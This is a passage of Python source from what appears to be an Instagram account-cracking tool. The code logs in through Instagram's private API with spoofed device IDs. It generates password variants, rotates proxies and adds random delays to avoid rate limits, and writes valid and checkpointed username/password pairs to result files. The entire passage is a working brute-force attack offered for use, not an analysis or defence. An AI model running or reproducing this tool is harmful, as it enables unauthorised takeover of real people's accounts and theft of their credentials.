            "country_codes": '[{"country_code":"1","source":["default"]}]',
            "phone_id": encryption.phone_id,
            "enc_password": enc_password,
            "username": username,
            "adid": encryption.advertising_id,
            "guid": encryption.uuid,
            "device_id": encryption.device_id,
            "google_tokens": "[]",
            "login_attempt_count": "0",
        }
        
        response = session.post(
            LOGIN_URL,
            data=data,
            headers=encryption.headers,
            timeout=30,
            allow_redirects=False
        )
        
        try:
            response_data = response.json()
        except:
            response_data = {"raw_response": response.text[:500]}
        
        # Initialize followers/following counts
        followers_c = "N/A"
        following_c = "N/A"
        
        # Try to get profile info for checkpoint accounts
        if response.status_code == 400 or 'challenge_required' in response_data:
            try:
                profile_url = f"https://i.instagram.com/api/v1/users/web_profile_info/?username={username}"
                profile_res = session.get(profile_url, headers=encryption.headers, timeout=10)
                if profile_res.status_code == 200:
                    profile_data = profile_res.json()
                    followers_c = profile_data.get("data", {}).get("user", {}).get("edge_followed_by", {}).get("count", "N/A")
                    following_c = profile_data.get("data", {}).get("user", {}).get("edge_follow", {}).get("count", "N/A")
            except:
                pass
        
        if response.status_code == 200 and "logged_in_user" in response_data:
            suces_ = Tree(Panel.fit("[bold green]LOGIN : SUCCESS[/bold green]", title="Status"))
            suces_.add(Panel.fit(f"[bold green]{username}[/bold green]", title="Username"))
            suces_.add(Panel.fit(f"[bold green]{password}[/bold green]", title="Password"))
            suces_.add(Panel.fit(f"[bold green]{encryption.device_settings['manufacturer']} {encryption.device_settings['model']}[/bold green]", title="Device"))
            suces_.add(Panel.fit(f"[bold green]{encryption.device_settings['app_version']}[/bold green]", title="Version"))
            console.print(suces_)
            
            with open('Results/Ok.txt', 'a') as f:
                f.write(f"{username}|{password}\n")
            return True
            
        elif response.status_code == 400 and 'challenge_required' in response_data:
            chk_p = Tree(
                Panel.fit(
                    "[bold yellow]LOGIN : CHECKPOINT[/bold yellow]",
                    title="Status"
                )
            )
            
            chk_p.add(
                Panel.fit(
                    f"[bold yellow]{username}[/bold yellow]",
                    title="Username"
                )
            )
            
            chk_p.add(
                Panel.fit(
                    f"[bold yellow]{password}[/bold yellow]",
                    title="Password"
                )
            )
            
            chk_p.add(
                Panel.fit(
                    f"[bold yellow]{following_c}[/bold yellow]",
                    title="Following"
                )
            )
            
            chk_p.add(
                Panel.fit(
                    f"[bold yellow]{followers_c}[/bold yellow]",
                    title="Followers"
                )
            )
            
            console.print(chk_p)
            
            with open('Results/Cp.txt', 'a') as f:
                f.write(f"{username}|{password}\n")
            return False
            
        elif response.status_code == 400 and 'bad_password' in str(response_data):
            console.print(f"[red]BAD PASSWORD: {username}:{password}[/red]")
            return False
            
        elif response.status_code == 429:
            console.print(f"[yellow]RATE LIMITED - waiting 60 seconds...[/yellow]")
            time.sleep(60)
            return False
            
        else:
            console.print(f"[red]FAILED: {username}:{password} - {response_data.get('message', 'Unknown')}[/red]")
            return False
            
    except Exception as e:
        console.print(f"[red]Error: {str(e)[:100]}[/red]")
        return False


def generate_password_combinations(base_password, additional_passwords):
    return [base_password + suffix for suffix in additional_passwords]


def brute_force_with_threading(credentials, passwords, proxy_manager, version_manager, key_manager):
    def attempt(username, base_password):
        password_combinations = generate_password_combinations(base_password, passwords)
        
        for password in password_combinations:
            if try_login(None, username, password, proxy_manager, version_manager, key_manager):
                return True
            time.sleep(random.uniform(5, 10))
        return False
    
    for username, base_password in credentials:
        attempt(username, base_password)


def crack__():
    credentials = load_credentials()
    if not credentials:
        return
    
    console.print(Panel.fit(f"Loaded {len(credentials)} Accounts.", title="Status"))
    
    console.print(
        Panel.fit(
            "[bold white]"
            "1. Use proxies from Data/proxy.txt\n"
            "2. Run without proxies (Direct connection)\n"
            "3. Use custom proxy list"
            "[bold magenta]",
            title="[bold magenta]Proxy Options[/bold magenta]",
            border_style="magenta"
        )
    )
    
    proxy_choice = console.input("[bold magenta]└─➤ [/bold magenta]").strip()
    
    proxy_manager = None
    
    if proxy_choice == "1":
        proxies_list = load_proxies("Data/proxy.txt")
        if proxies_list:
            proxy_manager = ProxyManager(proxies_list)
    
    elif proxy_choice == "2":
        proxy_manager = None
    
    elif proxy_choice == "3":
        console.print(Panel.fit("Enter proxies (one per line, empty line to finish):", title="Custom Proxies"))
        proxies_list = []
        while True:
            proxy = console.input("[bold magenta]└─➤ [/bold magenta]").strip()
            if not proxy:
                break
            proxies_list.append(proxy)
        
        if proxies_list:
            proxy_manager = ProxyManager(proxies_list)
    
    version_manager = AppVersionManager()
    key_manager = EncryptionKeyManager()

    confirm = console.input("[bold magenta]Start brute force? (y/n): [/bold magenta]").strip().lower()
    if confirm != 'y':
        console.print("[!] Aborted.")
        return
    
    
    brute_force_with_threading(credentials, PASSWORDS, proxy_manager, version_manager, key_manager)







if __name__ == "__main__":
    if not os.path.exists('Data'):
        os.makedirs('Data')

    if not os.path.exists('Dump'):
        os.makedirs('Dump')
    if not os.path.exists('Results'):
        os.makedirs('Results')
    if not os.path.exists('Data/user.txt'):
        os.makedirs('Data/user.txt', exist_ok=True)
    if not os.path.exists('Data/coki.txt'):
        os.makedirs('Data/coki.txt', exist_ok=True)

    menu()
